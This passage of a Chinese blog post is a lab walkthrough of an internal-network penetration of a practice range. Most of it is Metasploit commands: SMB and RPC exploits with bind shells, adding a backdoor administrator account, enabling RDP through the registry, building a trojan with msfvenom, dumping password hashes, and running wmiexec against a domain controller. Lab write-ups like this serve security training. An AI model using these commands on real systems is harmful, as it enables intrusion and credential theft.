+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"></span><br><span class="line">set payload windows/shell/bind_tcp</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这个payload可以让目标主机开通个tcp监视器，然后让攻击主机去连接目标主机端口就可以执行shell</p>
+<p>攻击成功，进入win2003的shell</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104415099.png" alt="image-20210809104415099"></p>
+<p>获取目标主机权限后，首先查看权限级别是否为管理员权限，然后考虑提权的问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+<p>可以看到此时执行的权限为system，系统管理员权限</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104902785.png" alt="image-20210809104902785"></p>
+<p>查看目标主机的系统相关信息，特别是补丁等信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809172615660.png" alt="image-20210809172615660"></p>
+<p>由于此时的荷载直接就进入cmd窗口并不能使用工具，而且该权限为管理员权限，有两条思路:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.添加新用户将其放入管理员用户组中以管理员的权限执行(添加用户原因是因为我们不知道管理员的密码无法登录)，然后开通3389(远程桌面)、22(ssh端口)等端口，通过连接前面的端口服务将生成的后台木马传入目标主机，然后使用msf等待上线。使用mimikatz、hashdump等来读内存和注册表中的密码，因为域内该主机的系统是Winserver 2008,默认存储明文密码，不需要进行sha1解密等</span><br><span class="line"></span><br><span class="line">2.寻找其他攻击载荷，直接通过msf拿到session</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>1.添加管理员组新用户，开通敏感服务连接上传木马</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net   user    haoyun        Yzt096877     /add                            ###添加haoyun用户</span><br><span class="line">           </span><br><span class="line">net   user   localgroup   administrators     haoyun     /add              ###添加haoyun到管理员用户组中</span><br></pre></td></tr></table></figure>
+
+
+
+<p>开启3389远程桌面服务，要在cmd窗口开启3389端口通过修改注册表和使用内网穿透工具netsh等</p>
+<p>由于这里没有办法上传netsh，只能通过在cmd修改注册表开启远程桌面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;              ###查询注册表键值</span><br><span class="line"></span><br><span class="line">reg delete &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections     ###删除注册表键值</span><br><span class="line"></span><br><span class="line">reg add     &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d   ###添加注册表键值修改FdenyTSConnections键值</span><br></pre></td></tr></table></figure>
+
+<p>这是原来的注册表中的fDenyTSConnections 为0x1(十六进制)，当该值为1时，表示3389服务没有开启</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809142515031.png" alt="image-20210809142515031"></p>
+<p>修改目标键值后，该键值为0，如下图:</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809143417396.png" alt="image-20210809143417396"></p>
+<p>可以看到3389端口开启</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809143459976.png" alt="image-20210809143459976"></p>
+<p>连接远程桌面有两种方式:</p>
+<p>1.返回到msf中使用rdesktop命令连接目标主机的3389端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop   -a  16 -r disk:share=/root/shell  192.168.52.141   -u haoyun   -p  Yzt096877</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rdesktop相关命令参数:</span><br><span class="line">-f 全屏</span><br><span class="line">-a 16位色</span><br><span class="line">-u xxxxxx 登录用户，可选</span><br><span class="line">-p xxxxxx 登录密码，可选</span><br><span class="line">-r clipboard:PRIMARYCLIPBOARD 重要，剪贴板可以与远程桌面交互</span><br><span class="line">-a 16 颜色，可选，不过最高就是16位</span><br><span class="line">-z 压缩，可选</span><br><span class="line">-g 1024x768 分辨率，可选，缺省是一种比当前本地桌面低的分辨率</span><br><span class="line">-P 缓冲，可选</span><br><span class="line">-r disk:wj=/home/magicgod 映射虚拟盘，可选，会在远程机器的网上邻居里虚拟出一个映射盘，功能很强，甚至可以是软盘或光盘</span><br><span class="line">-r sound:off 关闭声音，当然也可以把远程发的声音映射到本地来。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2.通过venom工具开启个代理，使用proxychains配置代理连接</p>
+<p>venom连接成功后，开启代理9999端口</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809155333106.png" alt="image-20210809155333106"></p>
+<p>然后配置proxychains配置文件，设置代理ip和端口为127.0.0.1 999</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim   /etc/proxychains.conf</span><br><span class="line"></span><br><span class="line">在配置文件最后一行修改为自己的代理端口</span><br><span class="line">socks5  127.0.0.1  9999         </span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后使用rdesktop连接内网远程桌面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains   rdesktop  192.168.52.141  -r disk:share=/root/shell</span><br></pre></td></tr></table></figure>
+
+<p>输入账号密码后，连接成功</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809155853825.png" alt="image-20210809155853825"></p>
+<p>将msfvenom生成的木马通过远程桌面传入目标主机</p>
+<p>这里使用上面的反弹shell连接失败，没有返回通道(因为内网主机无法通过跳板机来连接攻击主机，而只有攻击主机才能去连接内网主机，所以反向shell不能使用)。所以使用正向连接荷载生成木马bind.exe，将其上传到win2003上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp   ARCH=x86   PLATFROM=WIN Rhost=192.168.52.141 -f exe &gt; bind.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在msf上使用exploit/multi/handler模块的正向payload  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use  exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.52.141</span><br></pre></td></tr></table></figure>
+
+<p>连接成功，管道打开</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809171049187.png" alt="image-20210809171049187"></p>
+<p><strong>2.使用相关荷载攻击</strong></p>
+<p>通过在漏洞库中搜索win2003相关的漏洞</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809172910901.png" alt="image-20210809172910901"></p>
+<p>这里尝试ms08-067和ms06_040进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注:MS08-067漏洞将会影响除Windows Server 2008 Core以外的所有Windows系统，包括：Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>2.1 ms08-067漏洞利用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search ms08-067          ###搜索相关模块</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/bind_tcp    ###使用正向shell荷载</span><br><span class="line"></span><br><span class="line">set rhost 192.168.52.1141           ###设置目标主机Ip地址</span><br></pre></td></tr></table></figure>
+
+<p>攻击成功，管道打开</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809173703941.png" alt="image-20210809173703941"></p>
+<p><strong>2.2 ms06-040漏洞利用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search  ms06-040</span><br><span class="line"></span><br><span class="line">use  exploit/windows/smb/ms06_040_netapi</span><br><span class="line"></span><br><span class="line">set payload  windows/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">set rhost    192.168.52.141</span><br><span class="line"></span><br><span class="line">set target  5</span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用成功，攻击成功，管道打开</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809174522308.png" alt="image-20210809174522308"></p>
+<p><strong>2.3 ms03-026漏洞利用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞实质上影响的是使用RPC的DCOM接口，此接口处理由客户端机器发送给服务器的DCOM对象激活请求(如UNC路径)。攻击者通过向目标发送畸形  RPC  DCOM请求来利用这些漏洞。成功利用此漏洞可以以本地系统权限执行任意指令。攻击者可以在系统上执行任意操作 ，如安装程序、查看或更改、删除数据或创建系统管理员权限的帐户</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search ms03-026</span><br><span class="line"></span><br><span class="line">use   exploit/windows/dcerpc/ms03_026_dcom</span><br><span class="line"></span><br><span class="line">set payload  windows/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">set rhost  192.168.52.141</span><br></pre></td></tr></table></figure>
+
+
+
+<p>漏洞利用成功，管道打开</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809175300540.png" alt="image-20210809175300540"></p>
+<h4 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h4><p>如下获取用户账号和密码hash值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">或者</span><br><span class="line">run  post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看到目标主机的用户账号和密码hash值</p>
+<p>数据的输出格式为：用户名：SID：LM哈希：NTLM哈希:::</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809175750389.png" alt="image-20210809175750389"></p>
+<p>由于windows2008之前的操作系统密码存储都是以明文形式的，直接加载mimikatz模块后使用wdigest进行抓取</p>
+<h4 id="域控主机获取"><a href="#域控主机获取" class="headerlink" title="域控主机获取"></a>域控主机获取</h4><h4 id="漏洞检测利用-1"><a href="#漏洞检测利用-1" class="headerlink" title="漏洞检测利用"></a>漏洞检测利用</h4><p>在之前的信息收集中，得到域控主机开放445和139端口，猜测也有可能存在ms17-010漏洞，对其进行漏洞检测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/smb/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<p>检测出来可能存在ms17-010漏洞</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810113004761.png" alt="image-20210810113004761"></p>
+<p>然后检测是否是管理员权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use admin/smb/ms17_010_command</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>可以看到为管理员账户</p>
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810120321187.png"></p>
+<p>使用上面的ms17-010的模块都没有返回管道，建立会话失败</p>
+<p>域控主机开放137，139，445端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果开启了137端口（wmi）首先还是建议用wmi , 可以直接利用`auxiliary/scanner/smb/impacket/wmiexec`来代码执行，就可以来开启3389 ，以及配置防火墙等。</span><br><span class="line"></span><br><span class="line">如果开启了`139，445`端口，可以先尝试用exploit/windows/smb/pspexec 来登录，弹正向shell.然后代码执行开启3389，配置防火墙</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WMIEXEC支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。WMIEXEC需要提供账号密码进行远程连接，但是如果没有破解出账号密码，也可以配合WCE的hash注入功能一起使用，先进行hash注入，然后再使用WMIEXEC即可。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>下面使用wmiexec攻击模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use  auxiliary/scanner/impacket/wmicexec</span><br><span class="line">set rhost  192.168.52.138</span><br><span class="line">set SMBPass  域控密码</span><br><span class="line">set SMBUser  域控账号</span><br><span class="line">set command  执行的命令</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810142402809.png" alt="image-20210810142402809"></p>
+<p>可以看到输入的命令执行成功，这样的话，可以开启远程桌面和使用共享文件将木马复制到域控主机上，然后开启正向shell监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\192.168.52.140\shell\shell.exe C:\1.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>原理:整个过程是先调用WMI通过账号密码或者NTLM认证（WCE注入）连接到远程计算机，然后如果提供了账号密码，则用这个账号密码建立一个到目标的IPC连接。随后WMI会建立一个共享文件夹，用于远程读取命令执行结果。</p>
+<p>当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹中。最后，通过FSO组件访问远程共享文件夹中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享</p>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<div>分享</div>
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+		
+			<a href="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/" title="" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2021/09/14/hello-world/" title="Hello World">
+								Hello World			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								九月 14日, 2021				
+							</p>
+							<p class="relate-post-content">
+								Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2021/09/14/hello-world/" title="Hello World">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="Hello World"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+
+</div>
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+
+		
+			
+			<!-- socialShare share -->
+			<div class="social-share"></div>
+
+<!--  css & js -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+			
+		
+		
+	
+</div>
+
+
+				</div>
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2017 - 2021, content by Sariay. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+  
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
